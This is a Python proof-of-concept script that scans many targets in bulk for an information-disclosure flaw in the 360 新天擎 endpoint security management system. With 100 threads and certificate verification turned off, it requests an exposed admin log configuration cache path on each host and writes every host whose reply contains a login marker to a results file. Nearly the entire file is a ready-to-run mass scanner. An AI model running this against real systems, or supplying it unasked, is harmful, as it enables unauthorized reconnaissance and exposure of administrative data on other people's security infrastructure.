import argparse
from multiprocessing.dummy import Pool
import requests
requests.packages.urllib3.disable_warnings()
import sys


def main():
    banner()
    paserse = argparse.ArgumentParser(description="360 新天擎终端安全管理系统信息泄露漏洞")
    paserse.add_argument('-u','--url',help="please input your url")
    paserse.add_argument('-f','--file',help="please input your file")
    args = paserse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def banner():
    banner = """
    
    
 $$$$$$\   $$$$$$\   $$$$$$\        $$$$$$\            $$$$$$\                                              $$\     $$\                           $$\                                               $$\                           
$$ ___$$\ $$  __$$\ $$$ __$$\       \_$$  _|          $$  __$$\                                             $$ |    \__|                          $$ |                                              $$ |                          
\_/   $$ |$$ /  \__|$$$$\ $$ |        $$ |  $$$$$$$\  $$ /  \__|$$$$$$\   $$$$$$\  $$$$$$\$$$$\   $$$$$$\ $$$$$$\   $$\  $$$$$$\  $$$$$$$\        $$$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$\   $$$$$$$\ 
  $$$$$ / $$$$$$$\  $$\$$\$$ |        $$ |  $$  __$$\ $$$$\    $$  __$$\ $$  __$$\ $$  _$$  _$$\  \____$$\\_$$  _|  $$ |$$  __$$\ $$  __$$\       $$  __$$\ $$  __$$\ $$  __$$\  \____$$\ $$  _____|$$  __$$\ $$  __$$\ $$  _____|
  \___$$\ $$  __$$\ $$ \$$$$ |        $$ |  $$ |  $$ |$$  _|   $$ /  $$ |$$ |  \__|$$ / $$ / $$ | $$$$$$$ | $$ |    $$ |$$ /  $$ |$$ |  $$ |      $$ |  $$ |$$ |  \__|$$$$$$$$ | $$$$$$$ |$$ /      $$ |  $$ |$$$$$$$$ |\$$$$$$\  
$$\   $$ |$$ /  $$ |$$ |\$$$ |        $$ |  $$ |  $$ |$$ |     $$ |  $$ |$$ |      $$ | $$ | $$ |$$  __$$ | $$ |$$\ $$ |$$ |  $$ |$$ |  $$ |      $$ |  $$ |$$ |      $$   ____|$$  __$$ |$$ |      $$ |  $$ |$$   ____| \____$$\ 
\$$$$$$  | $$$$$$  |\$$$$$$  /      $$$$$$\ $$ |  $$ |$$ |     \$$$$$$  |$$ |      $$ | $$ | $$ |\$$$$$$$ | \$$$$  |$$ |\$$$$$$  |$$ |  $$ |      $$$$$$$  |$$ |      \$$$$$$$\ \$$$$$$$ |\$$$$$$$\ $$ |  $$ |\$$$$$$$\ $$$$$$$  |
 \______/  \______/  \______/       \______|\__|  \__|\__|      \______/ \__|      \__| \__| \__| \_______|  \____/ \__| \______/ \__|  \__|      \_______/ \__|       \_______| \_______| \_______|\__|  \__| \_______|\_______/ 
                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                  
    """
    print(banner)
def poc(target):
    url = target + '/runtime/admin_log_conf.cache'
    try:
        result = requests.get(url=url,timeout=5,verify=False).text
        if '登录' in result:
            with open('result360.txt','a') as fp1:
                fp1.write(f'[+]{target} is veriable'+'\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server error')

if __name__ == '__main__':
    main()